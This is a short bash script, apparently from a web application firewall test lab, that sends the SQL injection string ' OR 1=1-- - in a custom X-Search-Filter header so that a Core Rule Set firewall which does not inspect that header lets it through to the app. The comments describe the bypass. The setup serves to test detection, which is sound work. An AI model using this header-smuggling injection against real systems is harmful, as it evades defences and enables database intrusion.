#!/usr/bin/env bash
# A03 attack (bypass): put the SQLi in a custom header the WAF does not inspect.
# q stays benign so CRS lets the request through; the payload rides in
# X-Search-Filter and reaches the app, which flags it at the sink.
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)/scripts/env.sh"
C -H "X-Search-Filter: ' OR 1=1-- -" "$BASE/api/search?q=hello" >/dev/null
